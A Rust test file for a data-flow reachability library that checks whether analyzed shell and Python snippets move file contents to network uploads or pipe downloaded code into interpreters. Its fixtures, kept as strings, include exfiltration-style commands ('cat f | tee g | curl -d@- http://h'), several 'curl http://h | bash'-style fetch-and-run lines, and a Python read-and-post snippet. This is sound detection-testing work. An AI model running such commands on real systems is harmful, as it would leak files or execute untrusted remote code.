//! Flow-reachability acceptance battery for `effinterp-trace`. Fixtures are generated
//! by the `effinterp-engine` frontend (a dev-dependency) purely to produce serialized
//! `Plan`s; the consumer under test (`effinterp_trace::reachable_pairs`) then answers
//! reachability from the `Plan` alone, never re-parsing the source.
//!
//! Every assertion is a mechanical fact: a producer effect reaches (or does not
//! reach) a consumer effect. The negatives are the point -- they prove the walk
//! does not invent paths.

use effinterp_engine::{Engine, default_limits};
use effinterp_proto::{
    CausalReason, ExecutionRealm, OccurrenceKind, Plan, ResourceExpr, ResourceIdentity, Subject,
    validate_plan,
};
use effinterp_trace::{
    Reach, Reachability, ReachabilityLimit, causal_path_in_graph, causal_path_in_graph_with,
    reachable_pairs,
};

fn shell(source: &str) -> Plan {
    plan(Subject::Shell {
        source: source.into(),
        cwd: Some("/w".into()),
        context: Default::default(),
    })
}

fn py(source: &str) -> Plan {
    plan(Subject::Source {
        dialect: None,
        language: "python".into(),
        source: source.into(),
        cwd: Some("/w".into()),
        context: Default::default(),
    })
}

fn plan(subject: Subject) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&subject)
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));
    plan
}

fn complete_pairs(plan: &Plan) -> Vec<Reach> {
    match reachable_pairs(plan).expect("causality detail required") {
        Reachability::Complete(pairs) => pairs,
        Reachability::Saturated { limits, .. } => {
            panic!("reachability unexpectedly saturated: {limits:?}")
        }
    }
}

/// Whether some producer with `from_op` reaches some consumer with `to_op`.
fn reaches(plan: &Plan, from_op: &str, to_op: &str) -> bool {
    complete_pairs(plan)
        .iter()
        .any(|r| r.from.op == from_op && r.to.op == to_op)
}

/// Whether some producer whose op starts with `from_prefix` reaches `to_op`.
fn reaches_prefix(plan: &Plan, from_prefix: &str, to_op: &str) -> bool {
    complete_pairs(plan)
        .iter()
        .any(|r| r.from.op.starts_with(from_prefix) && r.to.op == to_op)
}

// 1. cat -> tee -> curl upload: the file read reaches the upload.
#[test]
fn read_reaches_upload_through_tee() {
    let plan = shell("cat f | tee g | curl -d@- http://h");
    assert!(reaches(&plan, "filesystem.read", "network.upload"));

    // The reported path starts at the read effect and ends at the upload effect.
    let pair = complete_pairs(&plan)
        .into_iter()
        .find(|r| r.from.op == "filesystem.read" && r.to.op == "network.upload")
        .unwrap();
    for endpoint in [pair.path.first(), pair.path.last()] {
        assert!(
            plan.causality
                .graph
                .as_ref()
                .expect("causality detail required")
                .nodes
                .iter()
                .any(|node| {
                    Some(&node.id) == endpoint
                        && matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. })
                })
        );
    }
    assert!(pair.path.len() >= 2);
}

// 2. curl | bash: the network response reaches code execution.
#[test]
fn network_reaches_code_execution() {
    let plan = shell("curl http://h | bash");
    assert!(reaches_prefix(&plan, "network.", "process.code_execution"));
}

#[test]
fn network_reaches_language_interpreter_code_execution() {
    for interpreter in ["python3.12", "nodejs", "ruby", "perl", "php"] {
        let plan = shell(&format!("curl http://h | {interpreter}"));
        assert!(
            reaches_prefix(&plan, "network.", "process.code_execution"),
            "{interpreter}"
        );
    }
}

// 3. curl -o out | bash: the response went to a file, so it does NOT reach code
//    execution even though a structural pipe edge is present.
#[test]
fn response_to_file_does_not_reach_code_execution() {
    let plan = shell("curl -o out http://h | bash");
    // The graph exists (the pipe wired two stages)...
    assert!(
        !plan
            .causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .edges
            .is_empty()
    );
    // ...but no network producer reaches the code execution.
    assert!(!reaches_prefix(&plan, "network.", "process.code_execution"));
}

// 4. Python variable-mediated read -> upload.
#[test]
fn py_read_reaches_upload() {
    let plan = py("import requests\n\
                   d = open(\"/p\").read()\n\
                   requests.post(\"http://h\", data=d)\n");
    assert!(reaches(&plan, "filesystem.read", "network.upload"));
}

// 5. Rebound variable: the tracked value is overwritten, so no path exists.
#[test]
fn py_rebound_variable_has_no_path() {
    let plan = py("import requests\n\
                   d = open(\"/p\").read()\n\
                   d = \"safe\"\n\
                   requests.post(\"http://h\", data=d)\n");
    assert!(!reaches(&plan, "filesystem.read", "network.upload"));
}

// 6. Plain sequencing wires no data.
#[test]
fn sequencing_has_no_path() {
    let plan = shell("cat f; curl -d@- http://h");
    assert!(!reaches(&plan, "filesystem.read", "network.upload"));
}

#[test]
fn pair_cap_reports_saturation_on_a_protocol_valid_full_plan() {
    let mut plan = shell("cat f | tee g | curl -d@- http://h");
    assert_eq!(complete_pairs(&plan).len(), 5);

    plan.analysis.limits.insert("max_causal_pairs".into(), 0);
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));
    assert_eq!(
        plan.causality.coverage.level,
        effinterp_proto::CoverageLevel::Full
    );
    assert!(plan.causality.coverage.gaps.is_empty());
    match reachable_pairs(&plan).expect("causality detail required") {
        Reachability::Saturated { pairs, limits, .. } => {
            assert!(pairs.is_empty());
            assert_eq!(
                limits.into_iter().collect::<Vec<_>>(),
                [ReachabilityLimit::Pairs]
            );
        }
        Reachability::Complete(pairs) => panic!("query claimed complete: {pairs:?}"),
    }
}

#[test]
fn depth_cap_reports_saturation_on_a_protocol_valid_full_plan() {
    let mut plan = shell("cat f | tee g | curl -d@- http://h");
    plan.analysis.limits.insert("max_causal_depth".into(), 0);
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));

    match reachable_pairs(&plan).expect("causality detail required") {
        Reachability::Saturated { pairs, limits, .. } => {
            assert!(pairs.is_empty());
            assert_eq!(
                limits.into_iter().collect::<Vec<_>>(),
                [ReachabilityLimit::Depth]
            );
        }
        Reachability::Complete(pairs) => panic!("query claimed complete: {pairs:?}"),
    }
}

#[test]
fn engine_causal_caps_report_every_binding_limit() {
    let mut limits = default_limits();
    limits.insert("max_causal_depth".into(), 8);
    limits.insert("max_causal_pairs".into(), 32);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: vec!["rm /tmp/state"; 100].join("; "),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));

    let reachability = reachable_pairs(&plan).expect("causality detail required");
    assert_eq!(reachability.pairs().len(), 32);
    let saturated = reachability
        .saturated_limits()
        .expect("causal caps must make the query partial");
    for limit in [ReachabilityLimit::Depth, ReachabilityLimit::Pairs] {
        assert!(
            saturated.contains(&limit),
            "missing {limit:?}: {saturated:?}"
        );
    }
    for limit in ["max_causal_depth", "max_causal_pairs"] {
        assert!(saturated.contains(&ReachabilityLimit::Producer(limit.into())));
    }
}

#[test]
fn producer_graph_truncation_cannot_report_complete_reachability() {
    let source = "cat a | tee b | curl -d@- http://h; \
                  cat c | tee d | curl -d@- http://h2; \
                  cat e | tee f | curl -d@- http://h3";
    assert_eq!(complete_pairs(&shell(source)).len(), 15);

    let mut limits = default_limits();
    limits.insert("max_causal_nodes".into(), 40);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));

    let reachability = reachable_pairs(&plan).expect("causality detail required");
    assert!(reachability.pairs().is_empty());
    assert!(
        reachability
            .saturated_limits()
            .expect("truncated graph must make the query partial")
            .contains(&ReachabilityLimit::Producer("max_causal_graph".into()))
    );
}

#[test]
fn caps_at_the_complete_result_boundary_do_not_report_saturation() {
    let mut plan = shell("cat f | tee g | curl -d@- http://h");
    let expected_pairs = complete_pairs(&plan);
    let graph = plan
        .causality
        .graph
        .as_ref()
        .expect("causality detail required");
    let resource_ids: Vec<_> = graph
        .nodes
        .iter()
        .filter(|node| matches!(node.occurrence, OccurrenceKind::ResourceInteraction { .. }))
        .map(|node| &node.id)
        .collect();
    let max_depth = resource_ids
        .iter()
        .flat_map(|from| {
            graph
                .nodes
                .iter()
                .filter_map(|to| causal_path_in_graph(graph, from, &to.id))
        })
        .map(|path| path.len() - 1)
        .max()
        .unwrap_or(0);
    plan.analysis
        .limits
        .insert("max_causal_pairs".into(), expected_pairs.len() as u64);
    plan.analysis
        .limits
        .insert("max_causal_depth".into(), max_depth as u64);
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));

    match reachable_pairs(&plan).expect("causality detail required") {
        Reachability::Complete(pairs) => assert_eq!(pairs.len(), expected_pairs.len()),
        Reachability::Saturated { limits, .. } => {
            panic!("exact caps unexpectedly saturated: {limits:?}")
        }
    }
}

/// A plan that declares no causal limits is still schema-valid; the walk
/// answers it instead of aborting.
#[test]
fn reachable_pairs_answers_a_plan_without_causal_limits() {
    // The engine's own limits map is complete, but a plan from another
    // producer need not declare causal limits at all.
    let mut plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "rm /tmp/state; rm /tmp/state".into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    plan.analysis.limits.remove("max_causal_depth");
    plan.analysis.limits.remove("max_causal_pairs");
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan: {e:?}"));
    assert!(!complete_pairs(&plan).is_empty());
}

/// A transfer states its direction: the source-side interaction is `from` and
/// the destination-side one is `to`. Reading it back from the plan alone must
/// never reverse them.
#[test]
fn transfers_preserve_their_direction() {
    let plan = shell("cp /w/a.txt /w/b.txt");
    let transfers = effinterp_trace::resource_transfers(&plan).expect("causality detail required");
    assert_eq!(transfers.len(), 1);
    assert_eq!(transfers[0].source.op, "filesystem.read");
    assert_eq!(transfers[0].destination.op, "filesystem.write");
}

/// A transfer's two endpoints keep their own realms. `docker cp` runs on the
/// host, so both of its endpoints stay in the host realm and the crossing into
/// the container is carried by the destination resource, not a container realm.
/// A copy executed inside the container keeps the container realm on both
/// endpoints. Dropping either would erase where the content ends up.
#[test]
fn transfer_endpoints_retain_their_own_realms() {
    let box_realm = ExecutionRealm::Container {
        runtime: "docker".into(),
        name: "box".into(),
    };

    let plan = shell("docker cp /w/a.txt box:/tmp/a.txt");
    let transfers = effinterp_trace::resource_transfers(&plan).expect("causality detail required");
    assert_eq!(transfers.len(), 1);
    assert_eq!(transfers[0].source.op, "filesystem.read");
    assert_eq!(transfers[0].destination.op, "container.copy");
    assert_eq!(transfers[0].source.realm, ExecutionRealm::Host);
    assert_eq!(transfers[0].destination.realm, ExecutionRealm::Host);
    assert!(matches!(
        &transfers[0].destination.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::Container { runtime, name: Some(name), .. },
        } if runtime == "docker" && name == "box"
    ));

    let plan = shell("docker exec box cp /tmp/a.txt /tmp/b.txt");
    let transfers = effinterp_trace::resource_transfers(&plan).expect("causality detail required");
    assert_eq!(transfers.len(), 1);
    assert_eq!(transfers[0].source.realm, box_realm);
    assert_eq!(transfers[0].destination.realm, box_realm);
}

/// A guarded transfer stays guarded: both endpoint conditions and the
/// operation's own guard reach the consumer, so a conditional copy can never
/// read as unconditional.
#[test]
fn guarded_transfers_retain_their_guard() {
    let plan =
        py("import shutil, os\nif os.environ.get('M'):\n    shutil.copy('/w/a.txt', '/w/b.txt')\n");
    let transfers = effinterp_trace::resource_transfers(&plan).expect("causality detail required");
    assert_eq!(transfers.len(), 1);
    assert_eq!(transfers[0].modality, effinterp_proto::Modality::May);
    let edge = plan
        .causality
        .graph
        .as_ref()
        .unwrap()
        .edges
        .iter()
        .find(|edge| edge.reason == CausalReason::ResourceTransfer)
        .unwrap();
    assert!(
        edge.condition.is_some(),
        "the plan's transfer edge is guarded"
    );
    assert_eq!(transfers[0].condition, edge.condition);
}

/// A transfer is a directed edge, so the source reaches the destination through
/// it and the destination does not reach back.
#[test]
fn a_transfer_is_reachable_only_in_its_own_direction() {
    let plan = shell("cp /w/a.txt /w/b.txt");
    assert!(reaches(&plan, "filesystem.read", "filesystem.write"));
    assert!(!reaches(&plan, "filesystem.write", "filesystem.read"));
}

#[test]
fn compact_plan_cannot_answer_reachability_or_transfer_queries() {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: vec!["cp".into(), "/a".into(), "/b".into()],
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    assert_eq!(
        reachable_pairs(&plan).unwrap_err(),
        effinterp_trace::DetailUnavailable
    );
    assert_eq!(
        effinterp_trace::resource_transfers(&plan).unwrap_err(),
        effinterp_trace::DetailUnavailable
    );
}

/// Guard witnesses name the route, so among equally short paths both
/// traversals must keep picking the one through the smallest occurrence id,
/// whatever order the edges were recorded in.
#[test]
fn equally_short_paths_break_ties_by_occurrence_id() {
    let mut plan = shell("cat /w/a | tee /w/b | curl -d@- http://h");
    let graph = plan
        .causality
        .graph
        .as_mut()
        .expect("causality detail required");
    let mut ids: Vec<_> = graph.nodes.iter().map(|node| node.id.clone()).collect();
    ids.sort();
    let [start, low, high, end] = [&ids[0], &ids[1], &ids[2], &ids[3]].map(Clone::clone);
    let template = graph.edges[0].clone();
    // A diamond recorded high branch first: start -> {high, low} -> end.
    graph.edges = [(&start, &high), (&start, &low), (&high, &end), (&low, &end)]
        .map(|(from, to)| {
            let mut edge = template.clone();
            edge.from = from.clone();
            edge.to = to.clone();
            edge
        })
        .into();
    let graph = &*graph;
    let nodes = graph.nodes.iter().map(|node| (&node.id, node)).collect();
    let mut edges_from = std::collections::BTreeMap::<_, Vec<_>>::new();
    for edge in &graph.edges {
        edges_from.entry(&edge.from).or_default().push(edge);
    }
    let through =
        |via: &effinterp_proto::OccurrenceId| vec![start.clone(), via.clone(), end.clone()];

    assert_eq!(
        causal_path_in_graph(graph, &start, &end),
        Some(through(&low))
    );
    assert_eq!(
        causal_path_in_graph_with(&nodes, &edges_from, &start, &end, |_| true, |_| true),
        Some(through(&low))
    );
    assert_eq!(
        causal_path_in_graph_with(
            &nodes,
            &edges_from,
            &start,
            &end,
            |node| node.id != low,
            |_| true
        ),
        Some(through(&high))
    );
}
